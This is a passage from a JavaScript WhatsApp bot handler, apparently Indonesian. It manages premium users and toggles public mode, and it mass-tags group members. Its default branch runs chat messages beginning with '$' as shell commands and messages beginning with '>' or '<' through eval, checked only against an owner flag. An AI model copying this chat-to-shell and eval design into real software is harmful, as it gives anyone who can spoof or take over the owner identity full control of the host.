if (input2 === global.owner || premium.includes(input) || input === botNumber) return reply(`𝘕𝘰𝘮𝘰𝘳 ${input2} 𝘴𝘶𝘥𝘢𝘩 𝘔𝘦𝘯𝘫𝘢𝘥𝘪 𝘗𝘳𝘦𝘮𝘪𝘶𝘮!`)
premium.push(input)
await fs.writeFileSync("./lib/database/premium.json", JSON.stringify(premium, null, 2))
}
break
case "delprem": {
    if (!isKyamiSilence) return kyami.sendMessage(from, {audio: fs.readFileSync('./media/vn/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
if (!m.quoted && !text) return reply("6285###")
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return m.reply(`Delete success`)
if (!premium.includes(input)) return m.reply(`Nomor ${input2} bukan reseller!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./lib/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`𝘚𝘶𝘤𝘤𝘦𝘴𝘴 𝘛𝘰 𝘋𝘦𝘭𝘦𝘵𝘦 𝘗𝘳𝘦𝘮𝘪𝘶𝘮`)
}
break
case "public":{
if (!isKyamiSilence) return kyami.sendMessage(from, {audio: fs.readFileSync('./media/vn/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
kyami.public = true
reply(`successfully changed to ${command}`)
}
break
case "self":{
if (!isKyamiSilence) return kyami.sendMessage(from, {audio: fs.readFileSync('./media/vn/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
kyami.public = false
reply(`successfully changed to ${command}`)
}
break
                
case 'tagall':{
if (!isKyamiSilence) return kyami.sendMessage(from, {audio: fs.readFileSync('./media/vn/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
if (!m.isGroup) return reply(mess.group);
const textMessage = args.join(" ") || "nothing";
let teks = `tagall message :\n> *${textMessage}*\n\n`;
const groupMetadata = await kyami.groupMetadata(m.chat);
const participants = groupMetadata.participants;
for (let mem of participants) {
teks += `@${mem.id.split("@")[0]}\n`;
}
kyami.sendMessage(m.chat, {
text: teks,
mentions: participants.map((a) => a.id)
}, { quoted: m });
}
break         
case "h":
case "hidetag": {
if (!m.isGroup) return reply(mess.group)
if (!isKyamiSilence) return kyami.sendMessage(from, {audio: fs.readFileSync('./media/vn/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
if (m.quoted) {
kyami.sendMessage(m.chat, {
forward: m.quoted.fakeObj,
mentions: participants.map(a => a.id)
})
}
if (!m.quoted) {
kyami.sendMessage(m.chat, {
text: q ? q : '',
mentions: participants.map(a => a.id)
}, { quoted: m })
}
}
break
                
            default:
                if (budy.startsWith('$')) {
                    if (!isKyamiSilence) return;
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return reply(err)
                        if (stdout) return reply(stdout);
                    });
                }
                
                if (budy.startsWith('>')) {
                    if (!isKyamiSilence) return;
                    try {
                        let evaled = await eval(budy.slice(2));
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
                        await reply(evaled);
                    } catch (err) {
                        reply(String(err));
                    }
                }
        
                if (budy.startsWith('<')) {
                    if (!isKyamiSilence) return
                    let kode = budy.trim().split(/ +/)[0]
                    let teks
                    try {
                        teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
                    } catch (e) {
                        teks = e
                    } finally {
                        await reply(require('util').format(teks))
                    }
                }
        
        }
    } catch (err) {
        console.log(require("util").format(err));
    }
};

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file)
  console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
  delete require.cache[file]
  require(file)
})
